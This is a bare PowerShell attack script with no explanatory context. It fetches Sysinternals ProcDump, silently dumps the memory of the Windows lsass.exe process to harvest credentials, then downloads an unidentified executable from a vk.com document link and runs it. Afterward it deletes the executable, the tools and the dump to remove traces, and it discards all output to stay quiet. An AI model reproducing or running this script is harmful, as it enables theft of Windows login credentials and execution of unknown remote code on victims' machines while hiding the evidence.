Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip{
    param([string]$zipfile, [string]$outpath)
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$TempDir = [System.IO.Path]::GetTempPath()
cd $TempDir
(new-object System.Net.WebClient).DownloadFile('https://download.sysinternals.com/files/Procdump.zip',"$TempDir/procdump.zip") > $null 2>&1

Unzip "$TempDir/procdump.zip" "$TempDir/procdump"
if ([intptr]::Size -ne 4) {
	$procdump = "$TempDir/procdump/procdump64.exe"
} else {
	$procdump = "$TempDir/procdump/procdump.exe"
}

Start-Process $procdump -Wait -NoNewWindow -ArgumentList "-ma lsass.exe lsassdump" > $null 2>&1

(new-object System.Net.WebClient).DownloadFile('https://vk.com/doc138418519_492631985',"$TempDir/a.exe") > $null 2>&1
Start-Process .\a.exe -Wait

cd ../
Remove-Item -Recurse -Force $TempDir/a.exe
Remove-Item -Recurse -Force "$TempDir/procdump"
Remove-Item -Force "$TempDir/procdump.zip"
Remove-Item -Force "$TempDir/lsassdump.dmp"

